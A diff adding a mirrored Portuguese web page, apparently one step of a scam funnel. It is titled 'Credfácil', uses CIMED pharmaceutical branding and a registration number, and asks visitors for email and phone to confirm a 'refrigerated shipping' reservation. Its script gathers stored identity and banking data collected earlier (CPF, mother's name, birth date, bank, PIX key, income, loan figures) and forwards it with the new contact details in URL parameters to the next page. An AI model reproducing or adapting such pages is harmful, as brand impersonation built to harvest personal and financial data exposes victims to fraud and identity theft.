@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from liberadoagora.digital/9.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 12 Feb 2026 02:39:16 GMT -->
+
+<head>
+
+  <meta charset="UTF-8">
+  <!-- Meta Pixel Code -->
+  <script>
+    !function (f, b, e, v, n, t, s) {
+      if (f.fbq) return; n = f.fbq = function () {
+        n.callMethod ?
+          n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+      };
+      if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+      n.queue = []; t = b.createElement(e); t.async = !0;
+      t.src = v; s = b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t, s)
+    }(window, document, 'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1598836378125085');
+    fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1598836378125085&ev=PageView&noscript=1" /></noscript>
+  <!-- End Meta Pixel Code -->
+
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids
+    async defer></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+  <link rel="stylesheet" href="css/fluid.css">
+  <title>Confirme seus Dados - Credfácil</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&amp;display=swap"
+    rel="stylesheet">
+  <style>
+    :root {
+      --green-primary: #FFC600;
+      --green-dark: #cc9e00;
+      --green-darker: #997700;
+      --green-light: #fff9c4;
+      --bg: #f8f9fa;
+      --card: #fff;
+      --text: #1f2937;
+      --text-light: #6b7280;
+      --success: #16a34a;
+      --danger: #ef4444;
+      --radius: 16px;
+      --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.08);
+      font-family: 'Poppins', sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: linear-gradient(135deg, var(--bg) 0%, #e2e8f0 100%);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding-top: 72px;
+    }
+
+    /* HEADER */
+    /* HEADER */
+    header.header {
+      background: linear-gradient(135deg, #ffcf33, #e6b200);
+      /* Yellow Gradient */
+      padding: 16px 0;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 2px 16px rgba(0, 0, 0, 0.1);
+      backdrop-filter: blur(10px);
+    }
+
+    .header-content {
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      max-width: 550px;
+      margin: 0 auto;
+    }
+
+    .logo-white {
+      height: 40px;
+      width: auto;
+      filter: brightness(0);
+      /* Made black */
+      opacity: 0.98;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    /* MAIN CONTAINER */
+    .main-container {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 550px;
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-lg);
+      padding: 32px 24px;
+      border: 1px solid rgba(29, 196, 99, 0.08);
+      animation: slideUp 0.6s ease-out;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* TITLE */
+    .page-title {
+      font-size: 1.6rem;
+      font-weight: 900;
+      color: var(--text);
+      margin-bottom: 12px;
+      text-align: center;
+      line-height: 1.2;
+    }
+
+    .page-subtitle {
+      font-size: 1rem;
+      color: var(--text-light);
+      margin-bottom: 24px;
+      text-align: center;
+      line-height: 1.6;
+    }
+
+    .highlight {
+      color: var(--green-primary);
+      font-weight: 700;
+    }
+
+    /* INFO CARD - COMPACTO */
+    .info-card {
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+      background: linear-gradient(135deg, var(--green-light), #fff9c4);
+      border: 1px solid rgba(255, 198, 0, 0.3);
+      border-radius: 10px;
+      padding: 16px;
+      margin-bottom: 24px;
+    }
+
+    .info-icon-box {
+      width: 40px;
+      height: 40px;
+      min-width: 40px;
+      background: linear-gradient(135deg, #FFC600, #e6b200);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .info-icon-box svg {
+      width: 22px;
+      height: 22px;
+      color: #000;
+    }
+
+    .info-content {
+      flex: 1;
+    }
+
+    .info-title {
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: #15803d;
+      margin-bottom: 10px;
+    }
+
+    .info-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .info-list li {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 5px 0;
+      font-size: 0.82rem;
+      color: #000;
+      font-weight: 500;
+    }
+
+    .info-list li .check-icon {
+      width: 16px;
+      height: 16px;
+      min-width: 16px;
+      background: var(--success);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .info-list li .check-icon svg {
+      width: 10px;
+      height: 10px;
+      color: white;
+    }
+
+    /* FORM */
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 8px;
+    }
+
+    .form-label .label-icon {
+      width: 20px;
+      height: 20px;
+      color: var(--green-primary);
+    }
+
+    .form-label .required {
+      color: var(--danger);
+      margin-left: 2px;
+    }
+
+    .form-input-wrapper {
+      position: relative;
+    }
+
+    .form-input-wrapper .input-icon {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 20px;
+      height: 20px;
+      color: #9ca3af;
+      pointer-events: none;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 14px 16px 14px 46px;
+      border: 2px solid #e5e7eb;
+      border-radius: 10px;
+      font-size: 1rem;
+      font-weight: 500;
+      font-family: 'Poppins', sans-serif;
+      color: var(--text);
+      transition: all 0.3s ease;
+      background: white;
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: var(--green-primary);
+      box-shadow: 0 0 0 4px rgba(29, 196, 99, 0.1);
+    }
+
+    .form-input:focus+.input-icon,
+    .form-input.success+.input-icon {
+      color: var(--green-primary);
+    }
+
+    .form-input::placeholder {
+      color: #9ca3af;
+    }
+
+    .form-input.error {
+      border-color: var(--danger);
+    }
+
+    .form-input.error+.input-icon {
+      color: var(--danger);
+    }
+
+    .form-input.success {
+      border-color: var(--success);
+    }
+
+    .error-message {
+      display: none;
+      margin-top: 6px;
+      font-size: 0.85rem;
+      color: var(--danger);
+      font-weight: 500;
+    }
+
+    .error-message.show {
+      display: block;
+    }
+
+    /* BUTTON */
+    .btn-submit {
+      width: 100%;
+      background: linear-gradient(135deg, #FFC600, #e6b200);
+
+      color: #000;
+      border: none;
+      padding: 18px 24px;
+      border-radius: 12px;
+      font-size: 1.1rem;
+      font-weight: 800;
+      cursor: pointer;
+      font-family: 'Poppins', sans-serif;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 20px rgba(29, 196, 99, 0.3);
+      margin-top: 28px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .btn-submit::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      animation: shimmer 3s infinite;
+    }
+
+    @keyframes shimmer {
+      0% {
+        left: -100%;
+      }
+
+      100% {
+        left: 100%;
+      }
+    }
+
+    .btn-submit:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 28px rgba(29, 196, 99, 0.4);
+    }
+
+    .btn-submit:active:not(:disabled) {
+      transform: translateY(0);
+    }
+
+    .btn-submit:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .btn-submit .btn-icon {
+      width: 22px;
+      height: 22px;
+    }
+
+    /* LOADING */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      backdrop-filter: blur(4px);
+    }
+
+    .loading-overlay.show {
+      display: flex;
+    }
+
+    .loading-content {
+      background: white;
+      padding: 40px;
+      border-radius: 16px;
+      text-align: center;
+      max-width: 300px;
+    }
+
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid var(--green-light);
+      border-top: 6px solid var(--green-primary);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loading-text {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    /* FOOTER */
+    footer.site-footer {
+      margin-top: auto;
+      background: linear-gradient(135deg, #FFC600, #e6b200);
+
+      color: #1f2937;
+      padding: 22px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    .footer-inner {
+      max-width: 550px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .footer-logo {
+      width: 40px;
+      height: auto;
+      filter: brightness(0);
+      /* Made black */
+    }
+
+    footer small {
+      font-size: 11px;
+      opacity: 0.95;
+      text-align: center;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 24px 20px;
+      }
+
+      .page-title {
+        font-size: 1.4rem;
+      }
+
+      .form-input {
+        padding: 13px 14px 13px 44px;
+        font-size: 0.95rem;
+      }
+
+      .btn-submit {
+        padding: 16px 20px;
+        font-size: 1rem;
+      }
+
+      .info-card {
+        padding: 14px;
+        gap: 12px;
+      }
+
+      .info-icon-box {
+        width: 36px;
+        height: 36px;
+        min-width: 36px;
+      }
+
+      .info-icon-box svg {
+        width: 20px;
+        height: 20px;
+      }
+
+      .info-list li {
+        font-size: 0.78rem;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <header class="header">
+    <div class="header-content" style="justify-content: center;">
+      <img src="https://i.ibb.co/dwZp5wrP/logo-cimed.png" alt="CIMED" class="logo-white">
+    </div>
+  </header>
+
+  <div class="main-container">
+    <div class="container">
+      <h1 class="page-title">
+        Confirme seus <span class="highlight">Dados de Contato</span>
+      </h1>
+      <p class="page-subtitle">
+        Para enviarmos a confirmação da sua reserva e atualizações sobre o envio refrigerado.
+      </p>
+
+      <div class="info-card">
+        <div class="info-icon-box">
+          <!-- Ícone de notificação/bell -->
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round"
+              d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
+          </svg>
+        </div>
+        <div class="info-content">
+          <h3 class="info-title">Você receberá:</h3>
+          <ul class="info-list">
+            <li>
+              <span class="check-icon">
+                <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                </svg>
+              </span>
+              Confirmação da sua reserva
+            </li>
+            <li>
+              <span class="check-icon">
+                <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                </svg>
+              </span>
+              Atualizações sobre o envio refrigerado
+            </li>
+            <li>
+              <span class="check-icon">
+                <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                </svg>
+              </span>
+              Código de rastreio quando disponível
+            </li>
+            <li>
+              <span class="check-icon">
+                <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                </svg>
+              </span>
+              Suporte da nossa especialista, se necessário
+            </li>
+          </ul>
+        </div>
+      </div>
+
+      <form id="contactForm" onsubmit="handleSubmit(event)">
+        <!-- Email Input -->
+        <div class="form-group">
+          <label class="form-label">
+            <svg class="label-icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+            </svg>
+            E-mail <span class="required">*</span>
+          </label>
+          <div class="form-input-wrapper">
+            <input type="email" id="emailInput" class="form-input" placeholder="seu@email.com" required
+              autocomplete="email">
+            <svg class="input-icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+            </svg>
+          </div>
+          <div class="error-message" id="emailError">
+            Por favor, insira um e-mail válido
+          </div>
+        </div>
+
+        <!-- Phone Input -->
+        <div class="form-group">
+          <label class="form-label">
+            <svg class="label-icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
+            </svg>
+            Telefone/Celular <span class="required">*</span>
+          </label>
+          <div class="form-input-wrapper">
+            <input type="tel" id="phoneInput" class="form-input" placeholder="(11) 98765-4321" required maxlength="15"
+              autocomplete="tel">
+            <svg class="input-icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
+            </svg>
+          </div>
+          <div class="error-message" id="phoneError">
+            Por favor, insira um telefone válido
+          </div>
+        </div>
+
+        <!-- Submit Button -->
+        <button type="submit" class="btn-submit" id="submitBtn">
+          <svg class="btn-icon" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+          </svg>
+          Confirmar e Continuar
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-content">
+      <div class="spinner"></div>
+      <p class="loading-text">Salvando seus dados...</p>
+    </div>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <img src="https://i.ibb.co/dwZp5wrP/logo-cimed.png" alt="CIMED" class="footer-logo">
+      <small style="color: black;">© 2026 CIMED INDÚSTRIA S.A.<br>02.814.497/0001-07</small>
+    </div>
+  </footer>
+
+  <script>
+    // Load user data
+    function loadUserData() {
+      const nome = localStorage.getItem('nome');
+      if (nome) {
+        const nomes = nome.trim().split(' ');
+        const ultimoNome = nomes.length > 1 ? nomes[nomes.length - 1] : '';
+        document.getElementById('userName').textContent = ultimoNome ? `${nomes[0]} ${ultimoNome}` : nomes[0];
+      } else {
+        // document.getElementById('userName').textContent = 'Usuário'; // Element removed/not present in this snippet
+      }
+
+      const cpf = localStorage.getItem('cpf');
+      if (cpf) {
+        const cpfLimpo = cpf.replace(/\D/g, '');
+        if (cpfLimpo.length === 11) {
+          // document.getElementById('userCpf').textContent = `${cpfLimpo.substring(0, 3)}.***.***-${cpfLimpo.substring(9, 11)}`; // Element removed
+        }
+      }
+
+      // Pre-fill email and phone if available
+      const savedEmail = localStorage.getItem('email');
+      const savedPhone = localStorage.getItem('telephone') || localStorage.getItem('telefone');
+
+      if (savedEmail) {
+        document.getElementById('emailInput').value = savedEmail;
+      }
+
+      if (savedPhone) {
+        document.getElementById('phoneInput').value = formatPhone(savedPhone);
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', loadUserData);
+
+    // Phone mask
+    const phoneInput = document.getElementById('phoneInput');
+    phoneInput.addEventListener('input', function (e) {
+      let value = e.target.value.replace(/\D/g, '');
+      value = formatPhone(value);
+      e.target.value = value;
+    });
+
+    function formatPhone(value) {
+      value = value.replace(/\D/g, '');
+      if (value.length <= 10) {
+        // (11) 1234-5678
+        value = value.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, '($1) $2-$3');
+      } else {
+        // (11) 98765-4321
+        value = value.replace(/^(\d{2})(\d{5})(\d{0,4}).*/, '($1) $2-$3');
+      }
+      return value;
+    }
+
+    // Email validation
+    const emailInput = document.getElementById('emailInput');
+    emailInput.addEventListener('blur', function () {
+      validateEmail(this.value);
+    });
+
+    function validateEmail(email) {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const emailError = document.getElementById('emailError');
+      const emailInput = document.getElementById('emailInput');
+
+      if (!emailRegex.test(email)) {
+        emailInput.classList.add('error');
+        emailInput.classList.remove('success');
+        emailError.classList.add('show');
+        return false;
+      } else {
+        emailInput.classList.remove('error');
+        emailInput.classList.add('success');
+        emailError.classList.remove('show');
+        return true;
+      }
+    }
+
+    // Phone validation
+    phoneInput.addEventListener('blur', function () {
+      validatePhone(this.value);
+    });
+
+    function validatePhone(phone) {
+      const phoneClean = phone.replace(/\D/g, '');
+      const phoneError = document.getElementById('phoneError');
+      const phoneInput = document.getElementById('phoneInput');
+
+      if (phoneClean.length < 10) {
+        phoneInput.classList.add('error');
+        phoneInput.classList.remove('success');
+        phoneError.classList.add('show');
+        return false;
+      } else {
+        phoneInput.classList.remove('error');
+        phoneInput.classList.add('success');
+        phoneError.classList.remove('show');
+        return true;
+      }
+    }
+
+    function handleSubmit(event) {
+      event.preventDefault();
+
+      const email = document.getElementById('emailInput').value.trim();
+      const phone = document.getElementById('phoneInput').value;
+      const phoneClean = phone.replace(/\D/g, '');
+
+      // Validação
+      const emailValid = validateEmail(email);
+      const phoneValid = validatePhone(phone);
+
+      if (!emailValid || !phoneValid) {
+        return false;
+      }
+
+      // 🔹 Garante formato internacional 55 + DDD + número
+      let phoneFormatted = phoneClean.replace(/^55/, '');
+      phoneFormatted = '55' + phoneFormatted;
+
+      // Mostrar loading
+      document.getElementById('loadingOverlay').classList.add('show');
+
+      // Salvar corretamente
+      localStorage.setItem('email', email);
+      localStorage.setItem('telephone', phoneFormatted);
+      localStorage.setItem('telefone', phoneFormatted);
+
+      console.log('Contact data saved:', { email, telephone: phoneFormatted });
+
+      // Capturar parâmetros da URL
+      const urlParams = new URLSearchParams(window.location.search);
+
+      // Adicionar dados de contato
+      urlParams.set('email', email);
+      urlParams.set('telephone', phoneFormatted);
+
+      const importantParams = [
+        'income', 'salaryDay', 'occupation', 'education', 'utm_source', 'utm_campaign',
+        'utm_medium', 'utm_content', 'utm_term', 'name', 'document', 'nome_mae',
+        'data_nasc', 'dueDate', 'cpf', 'nome', 'banco', 'chave_pix',
+        'selectedLoanAmount', 'selectedInstallments', 'selectedMonthlyPayment'
+      ];
+
+      importantParams.forEach(param => {
+        const value = localStorage.getItem(param);
+        if (value && !urlParams.has(param)) {
+          urlParams.set(param, value);
+        }
+      });
+
+      const finalParams = urlParams.toString();
+      const targetUrl = finalParams
+        ? `10.html?${urlParams.toString()}`
+        : '10.html';
+
+      setTimeout(() => {
+        window.location.href = targetUrl;
+      }, 1500);
+    }
+
+  </script>
+</body>
+
+<!-- Mirrored from liberadoagora.digital/9.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 12 Feb 2026 02:39:17 GMT -->
+
+</html>
